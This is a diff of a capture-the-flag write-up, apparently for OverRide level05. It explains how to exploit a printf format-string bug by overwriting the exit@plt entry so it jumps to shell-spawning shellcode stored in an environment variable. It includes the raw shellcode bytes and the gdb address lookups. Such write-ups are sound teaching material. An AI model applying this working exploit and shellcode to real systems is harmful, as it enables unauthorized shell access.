@@ -12,16 +12,16 @@ The program calls `printf` with buffer as format string. This is vunerable to `p
 
 ## Exploitation
 
-We need to overwrite with `printf` the address of `exit@plt`
+We need to overwrite the address of `exit@plt` with the address of our environment variable using `printf`. 
 
-1. Setup an environnement variable containing the shellcode
+1. Setup an environment variable containing the shellcode
 ```sh
 export SHCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
 ```
 
 2. Search for the right addresses
     - `0x080497e0` is the address to overwrite
-    - `0xffffdf2f` is the address to jump to
+    - `0xffffdf2f` is the address to jump on
 ```gdb
 (gdb) x/s *((char **)environ + 16)
 0xffffdf28:	 "SHCODE=\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
@@ -39,7 +39,7 @@ Dump of assembler code for function exit@plt:
 End of assembler dump.
 ```
 
-3. Craft and run the `printf` exploit. Note that we need to have the same `env` as `gdb`. Otherwise offsets don't match.
+3. Craft and run the `printf` exploit. Note that we need to have the same `env` as `gdb`. Otherwise offsets won't match.
 ```sh
 level05@OverRide:~$ gdb level05 
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
